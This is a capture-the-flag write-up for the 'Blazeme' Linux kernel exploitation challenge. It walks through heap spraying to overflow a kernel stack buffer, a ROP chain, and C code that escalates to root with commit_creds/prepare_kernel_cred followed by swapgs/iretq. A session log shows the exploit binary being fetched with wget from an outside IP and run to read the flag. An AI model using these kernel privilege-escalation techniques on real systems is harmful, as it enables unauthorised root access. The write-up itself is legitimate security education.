# Blazeme
**Category**: Pwn

420 Points

4 Solves

Problem description:

```
Kernel exploitation challenge!

ssh blazeme@18.222.40.104 password: guest

Download here (6 MB)

The flag in this archive is not the real flag. It's there to make you feel good when your exploit works locally.

Author: crixer
```

Basically, babby's first kernel pwn.

Ok, so we are given a vulnerable kernel module. First off, we see two problems:
 - race condition on read, what if kbuf becomes NULL after the check? not exploitable
 - `strncat(str, kbuf, strlen(kbuf))` with `char str[512]` on stack **exploitable**

We have a kernel stack overflow, but wait:
```C
#define KBUF_LEN (64)
// ...
if (count > KBUF_LEN) {
    printk(KERN_INFO "blazeme_wrtie invaild paramter count (%zu)\n", count);
    ret = ERR_BLAZEME_OK;
    goto out;
} 
```
Oof. So how do we overflow a 512-byte buffer with a 64-byte one?
Simple: `kbuf = kmalloc(KBUF_LEN, GFP_KERNEL)`, but `kbuf` is never freed.
Sometimes, the kernel will hand us a kbuf in the same page as last time, and the data is never deinitialized.
The idea is to repeatedly perform 64-byte non-null write on `/dev/blazeme` until we fill up 512+ bytes of contiguous non-null bytes.
In effect, that "page spray" will allow us to overflow the stack buffer.
However, the big caveat is that our payload must be non-null. Technically, you can work around this to get partial overwrites with null bytes, but it's not needed.

Using a pattern, we can deduce our return address has to be at offset 0x18 from the beginning of a 64-byte block.
However, we don't necessarily know *which* block will be the one to overflow the stack buffer. That means our ropchain needs to be <`64-0x18` bytes in length, giving us 5 gadgets.
Luckily, we are given vmlinuz so we extract it and we can use ROPgadget.py to find gadgets. Tons of non-null gadgets are available.
Since it's running in QEMU, there is no ASLR (hooray).

To pivot to userland, we need to jump to an address with the high 16 bits zeroed.
0xffffXXXXXXXXXXXX is kernelland, and we can't mmap into that, but 0x00007fXXXXXXXXXX seems to work fine.
With that gameplan in mind, our ropchain is:

```
0xffffffff810e14d6 mov ecx, 0x10 ; mov rax, rcx ; ret
0xffffffff8127b8f9 mov eax, 0x7fffffff ; pop rbp ; ret
0x1234123412341234 popped rbp value for previous gadget
0xffffffff81102330 shl rax, cl ; ret
0xFFFFFFFF8107BC1D call rax
```
And we'll mmap our kernel shellcode at 0x00007fffffff0000.

Now we have pivoted to userland, but we are still executing "as" kernel, e.g. we haven't exited the syscall.
That means it's time to escalate privileges, then finally return back to userland for a shell:

```C
struct trap_frame64 {
    void*     rip;
    uint64_t  cs;
    uint64_t  rflags;
    void*     rsp;
    uint64_t  ss;
} __attribute__ (( packed )) tf;

void  prepare_tf(void) {
    asm(
        "xor %eax, %eax;"
        "mov %cs, %ax;"
        "pushq %rax;   popq tf+8;"
        "pushfq;      popq tf+16;"
        "pushq %rsp; popq tf+24;"
        "mov %ss, %ax;"
        "pushq %rax;   popq tf+32;"
    );
    tf.rip = &shell;
    tf.rsp  -= 1024;   //  unused  part of  stack
}

void payload() {
   commit_creds(prepare_kernel_cred(0)); // we get these functions' addresses from kallsyms.
   asm("movq $tf, %rsp; swapgs; iretq;");
}
```

Note the `swapgs`. This is necessary on x64 before a `iretq`. With that we're done.

```
$ ssh blazeme@18.222.40.104
blazeme@18.222.40.104's password:
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-1054-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  Get cloud support with Ubuntu Advantage Cloud Guest:
    http://www.ubuntu.com/business/services/cloud

1 package can be updated.
0 updates are security updates.


*** System restart required ***
Last login: Tue Apr 24 09:56:16 2018 from 108.225.193.26
WARNING: Image format was not specified for '/tmp/tmp.SdKt0lWWkV' and probing guessed raw.
         Automatically detecting the format is dangerous for raw images, write operations on block 0 will be restricted.
         Specify the 'raw' format explicitly to remove the restrictions.
warning: TCG doesn't support requested feature: CPUID.01H:ECX.vmx [bit 5]
Welcome to Buildroot
buildroot login: blazeme
Password:
login: can't change directory to '/home/blazeme'
$ cd /tmp
$ wget 123.123.123.123/a.out
Connecting to 123.123.123.123 (123.123.123.123:80)
a.out                100% |*******************************|   825k  0:00:00 ETA
$ chmod +x a.out
$ ./a.out
cs=0x33 ss=0x2b rip=0x4009ae rsp=0x7fffd223f0a0 rflags=0x246
shellcode at 0x7fffffff0000 jumping to 0x400a17
Segmentation fault
$ ./a.out
cs=0x33 ss=0x2b rip=0x4009ae rsp=0x7ffeef33fae0 rflags=0x246
ashellcode at 0x7fffffff0000 jumping to 0x400a17
HACKED!!!!!!
$ ls
a.out        messages     messages.0   resolv.conf
$ cd /
$ ls
bin         lib         media       root        tmp
dev         lib64       mnt         run         usr
etc         linuxrc     opt         sbin        var
flag        lost+found  proc        sys
$ cat flag
blaze{bblaze{blaze{blaze{blaze}}}}
```

Interesting :)
